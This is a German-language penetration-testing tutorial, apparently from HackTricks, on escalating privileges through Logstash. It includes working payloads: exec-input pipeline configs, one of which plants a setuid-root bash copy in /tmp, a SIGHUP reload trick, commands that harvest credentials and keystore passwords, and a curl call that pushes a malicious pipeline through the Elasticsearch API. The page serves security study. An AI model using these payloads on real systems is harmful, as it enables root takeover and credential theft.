# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash wird verwendet, um **Logs zu sammeln, zu transformieren und zu versenden** über ein System, das als **pipelines** bekannt ist. Diese pipelines bestehen aus den Stufen **input**, **filter** und **output**. Ein interessanter Aspekt ergibt sich, wenn Logstash auf einer kompromittierten Maschine läuft.

### Pipeline-Konfiguration

Pipelines werden in der Datei **/etc/logstash/pipelines.yml** konfiguriert, die die Speicherorte der Pipeline-Konfigurationen auflistet:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Diese Datei zeigt, wo die **.conf**-Dateien mit den Pipeline-Konfigurationen liegen. Beim Einsatz eines **Elasticsearch output module** ist es üblich, dass **pipelines** **Elasticsearch credentials** enthalten, die oft weitreichende Rechte haben, da Logstash Daten nach Elasticsearch schreiben muss. Wildcards in Konfigurationspfaden erlauben es Logstash, alle passenden Pipelines im angegebenen Verzeichnis auszuführen.

Wenn Logstash mit `-f <directory>` statt mit `pipelines.yml` gestartet wird, werden **alle Dateien in diesem Verzeichnis lexikographisch sortiert zusammengefügt und als eine einzige Config geparst**. Das hat 2 offensive Implikationen:

- Eine abgelegte Datei wie `000-input.conf` oder `zzz-output.conf` kann beeinflussen, wie die finale Pipeline zusammengesetzt wird
- Eine fehlerhafte Datei kann das Laden der gesamten Pipeline verhindern, daher Payloads sorgfältig validieren, bevor man sich auf auto-reload verlässt

### Schnelle Aufklärung auf einer kompromittierten Maschine

Auf einer Maschine, auf der Logstash installiert ist, schnell prüfen:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Prüfe außerdem, ob die lokale Monitoring-API erreichbar ist. Standardmäßig bindet sie an **127.0.0.1:9600**, was normalerweise ausreicht, sobald man auf dem Host gelandet ist:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Dies liefert normalerweise Pipeline-IDs, Laufzeitdetails und die Bestätigung, dass Ihre modifizierte Pipeline geladen wurde.

Aus aus Logstash wiedergewonnene Zugangsdaten entsperren häufig **Elasticsearch**, siehe [diese andere Seite über Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, identifizieren Sie zunächst den Benutzer, unter dem der Logstash-Dienst läuft — typischerweise der **logstash** Benutzer. Stellen Sie sicher, dass Sie **eines** der folgenden Kriterien erfüllen:

- Besitzen **write access** auf eine Pipeline **.conf** Datei **oder**
- Die **/etc/logstash/pipelines.yml** Datei verwendet ein Wildcard, und Sie können in den Zielordner schreiben

Zusätzlich muss **eine** der folgenden Bedingungen erfüllt sein:

- Möglichkeit, den Logstash-Dienst neu zu starten **oder**
- Die **/etc/logstash/logstash.yml** Datei hat **config.reload.automatic: true** gesetzt

Wenn ein Wildcard in der Konfiguration vorhanden ist, erlaubt das Erstellen einer Datei, die diesem Wildcard entspricht, die Ausführung von Befehlen. Zum Beispiel:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bestimmt **interval** die Ausführungsfrequenz in Sekunden. Im gezeigten Beispiel wird der **whoami**-Befehl alle 120 Sekunden ausgeführt, wobei seine Ausgabe an **/tmp/output.log** geleitet wird.

Mit **config.reload.automatic: true** in **/etc/logstash/logstash.yml** erkennt Logstash automatisch neue oder geänderte Pipeline-Konfigurationen und wendet sie an, ohne dass ein Neustart erforderlich ist. Wenn kein Wildcard vorhanden ist, können weiterhin Änderungen an bestehenden Konfigurationen vorgenommen werden, jedoch ist Vorsicht geboten, um Unterbrechungen zu vermeiden.

### Zuverlässigere Pipeline Payloads

Das `exec` input plugin funktioniert weiterhin in aktuellen Releases und benötigt entweder ein `interval` oder ein `schedule`. Es wird durch **forking** der Logstash JVM ausgeführt, daher kann dein Payload bei knappem Speicher mit `ENOMEM` fehlschlagen, anstatt stillschweigend zu laufen.

Ein praktischeres privilege-escalation payload ist in der Regel eines, das ein dauerhaftes Artefakt hinterlässt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Wenn du keine Berechtigung zum Neustarten hast, aber den Prozess signalisieren kannst, unterstützt Logstash unter Unix-ähnlichen Systemen ebenfalls ein durch **SIGHUP** ausgelöstes Neuladen:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Beachte, dass nicht jedes Plugin für automatisches Neuladen geeignet ist. Zum Beispiel verhindert das **stdin** input ein automatisches Neuladen, daher solltest du nicht davon ausgehen, dass `config.reload.automatic` immer deine Änderungen übernimmt.

### Geheimnisse aus Logstash stehlen

Bevor du dich nur auf Codeausführung konzentrierst, sammle die Daten, auf die Logstash bereits Zugriff hat:

- Anmeldedaten im Klartext sind oft hardcodiert inside `elasticsearch {}` outputs, `http_poller`, JDBC inputs, oder cloud-bezogenen Einstellungen
- Sichere Einstellungen können in **`/etc/logstash/logstash.keystore`** oder einem anderen `path.settings`-Verzeichnis liegen
- Das Keystore-Passwort wird häufig über **`LOGSTASH_KEYSTORE_PASS`** bereitgestellt, und paketbasierte Installationen beziehen es oft aus **`/etc/sysconfig/logstash`**
- Die Expansion von Environment-Variablen mit `${VAR}` wird beim Logstash-Start aufgelöst, daher lohnt sich eine Inspektion der Service-Umgebung

Nützliche Prüfungen:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Das ist ebenfalls prüfenswert, da **CVE-2023-46672** gezeigt hat, dass Logstash unter bestimmten Umständen sensible Informationen in Logs aufzeichnen kann. Auf einem post-exploitation host können deshalb alte Logstash-Logs und `journald`-Einträge Anmeldeinformationen offenlegen, selbst wenn die aktuelle Konfiguration das keystore referenziert statt Geheimnisse inline zu speichern.

### Missbrauch der zentralisierten Pipeline-Verwaltung

In einigen Umgebungen verlässt sich der Host überhaupt nicht auf lokale `.conf`-Dateien. Wenn **`xpack.management.enabled: true`** konfiguriert ist, kann Logstash zentral verwaltete Pipelines von Elasticsearch/Kibana abrufen, und nach Aktivierung dieses Modus sind lokale Pipeline-Konfigurationen nicht mehr die Quelle der Wahrheit.

Das bedeutet einen anderen Angriffspfad:

1. Elastic-Zugangsdaten aus lokalen Logstash-Einstellungen, dem keystore oder aus Logs wiederherstellen
2. Prüfen, ob das Konto das **`manage_logstash_pipelines`** Cluster-Privileg besitzt
3. Eine zentral verwaltete Pipeline erstellen oder ersetzen, sodass der Logstash-Host dein payload beim nächsten Poll-Intervall ausführt

Die für diese Funktion verwendete Elasticsearch-API ist:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dies ist besonders nützlich, wenn lokale Dateien schreibgeschützt sind, aber Logstash bereits registriert ist, um Pipelines remote abzurufen.

## Referenzen

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
